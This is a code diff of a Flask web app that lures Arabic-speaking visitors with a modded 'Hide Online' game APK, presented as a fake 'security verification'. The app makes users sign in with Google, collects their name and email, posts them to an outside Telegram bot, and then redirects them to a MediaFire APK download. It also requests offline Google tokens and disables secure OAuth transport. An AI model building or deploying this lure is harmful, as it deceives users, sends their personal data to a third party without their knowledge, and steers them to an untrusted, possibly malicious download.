@@ -1,101 +1,147 @@
 import os
 import requests
-from flask import Flask, redirect, render_template_string, request
+from flask import Flask, redirect, render_template_string, request, session, url_for
+from google_auth_oauthlib.flow import Flow
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
+app.secret_key = os.getenv("SECRET_KEY", "oauth_super_secret_key")
 
-GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
-GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
+os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
+
+CLIENT_SECRETS_FILE = "client_secret.json"
+SCOPES = [
+    "https://www.googleapis.com/auth/userinfo.email",
+    "https://www.googleapis.com/auth/userinfo.profile",
+    "openid",
+]
+
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-REDIRECT_URI = "https://samer-production.up.railway.app/auth/callback"
-
-MEDIAFIRE_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
+FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
 
 @app.route("/")
-def home():
-  google_login_url = (
-      f"https://accounts.google.com/o/oauth2/v2/auth?client_id={GOOGLE_CLIENT_ID}"
-      f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=email%20profile"
+def index():
+  return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>التحقق من الأمان</title>
+        <style>
+            * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
+            body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+            
+            .container {
+                width: 100%;
+                max-width: 400px;
+                padding: 30px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .title {
+                font-size: 22px;
+                font-weight: 500;
+                color: #202124;
+                margin-bottom: 12px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+                color: #5f6368;
+                margin-bottom: 30px;
+                line-height: 22px;
+            }
+
+            .google-btn {
+                width: 100%;
+                background: #fff;
+                color: #3c4043;
+                border: 1px solid #dadce0;
+                border-radius: 25px;
+                padding: 14px;
+                font-size: 15px;
+                font-weight: 500;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 12px;
+                text-decoration: none;
+                box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
+            }
+            .google-btn:hover { background: #f8f9fa; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="title">التحقق الأمني</div>
+            <div class="subtitle">يرجى تسجيل الدخول باستخدام حسابك للتأكد من أنك لست برنامج روبوت وللمتابعة إلى تحميل ملف اللعبة.</div>
+            
+            <a href="/login" class="google-btn">
+                <img src="https://www.svgrepo.com/show/475656/google-color.svg" width="20">
+                تسجيل الدخول بواسطة Google
+            </a>
+        </div>
+    </body>
+    </html>
+    """)
+
+
+@app.route("/login")
+def login():
+  flow = Flow.from_client_secrets_file(
+      CLIENT_SECRETS_FILE,
+      scopes=SCOPES,
+      redirect_uri=url_for("authorized", _external=True),
   )
-
-  return render_template_string(f"""
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول بواسطة جوجل</title>
-    <style>
-        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }}
-        body {{ background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }}
-        .login-container {{ background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; }}
-        h2 {{ margin-bottom: 30px; color: #1c1e21; font-size: 22px; text-align: center; font-weight: bold; }}
-        .google-btn {{ width: 100%; padding: 15px; background: #4285F4; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; text-decoration: none; gap: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }}
-        .google-btn:hover {{ background: #357ae8; }}
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <h2>تحميل لعبة Hide Online المهكرة</h2>
-        <a href="{google_login_url}" class="google-btn">
-            <span>تسجيل الدخول بحساب جوجل</span>
-        </a>
-    </div>
-</body>
-</html>
-""")
+  authorization_url, state = flow.authorization_url(
+      access_type="offline", include_granted_scopes="true"
+  )
+  session["state"] = state
+  return redirect(authorization_url)
 
 
-@app.route("/auth/callback")
-def auth_callback():
-  code = request.args.get("code")
-  if not code:
-    return "خطأ: لم يتم استقبال كود المصادقة"
+@app.route("/authorized")
+def authorized():
+  flow = Flow.from_client_secrets_file(
+      CLIENT_SECRETS_FILE,
+      scopes=SCOPES,
+      redirect_uri=url_for("authorized", _external=True),
+  )
+  flow.fetch_token(authorization_response=request.url)
 
-  token_url = "https://oauth2.googleapis.com/token"
-  payload = {
-      "code": code,
-      "client_id": GOOGLE_CLIENT_ID,
-      "client_secret": GOOGLE_CLIENT_SECRET,
-      "redirect_uri": REDIRECT_URI,
-      "grant_type": "authorization_code",
+  credentials = flow.credentials
+  session["credentials"] = {
+      "token": credentials.token,
+      "refresh_token": credentials.refresh_token,
+      "token_uri": credentials.token_uri,
+      "client_id": credentials.client_id,
+      "client_secret": credentials.client_secret,
+      "scopes": credentials.scopes,
   }
 
-  response = requests.post(token_url, data=payload)
+  user_info_service = requests.get(
+      "https://www.googleapis.com/oauth2/v1/userinfo",
+      headers={"Authorization": f"Bearer {credentials.token}"},
+  ).json()
 
-  if response.status_code != 200:
-    return f"خطأ في التحقق من حساب جوجل: {response.text}"
+  user_email = user_info_service.get("email")
+  user_name = user_info_service.get("name")
 
-  token_data = response.json()
-  access_token = token_data.get("access_token")
+  if BOT_TOKEN and CHAT_ID and user_email:
+    msg = (
+        "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم: "
+        f"{user_name}\n📧 البريد الإلكتروني: {user_email}"
+    )
+    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-  if not access_token:
-    return "فشل الحصول على الرمز المميز"
-
-  # جلب بيانات المستخدم من جوجل (الإيميل والاسم) لإرسالها للبوت
-  user_info_resp = requests.get(
-      "https://www.googleapis.com/oauth2/v2/userinfo",
-      headers={"Authorization": f"Bearer {access_token}"},
-  )
-
-  if user_info_resp.status_code == 200:
-    user_info = user_info_resp.json()
-    email = user_info.get("email", "غير معروف")
-    name = user_info.get("name", "مستخدم جديد")
-
-    # إرسال البيانات إلى بوت تيليجرام
-    if BOT_TOKEN and CHAT_ID:
-      msg = f"🎉 شخص جديد سجل دخول لتحميل اللعبة!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
-      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-      requests.post(
-          telegram_url, json={"chat_id": CHAT_ID, "text": msg}
-      )
-
-  # التوجيه المباشر لرابط التحميل بعد إرسال الرسالة للبوت
-  return redirect(MEDIAFIRE_URL)
+  return redirect(FINAL_REDIRECT_URL)
 
 
 if __name__ == "__main__":
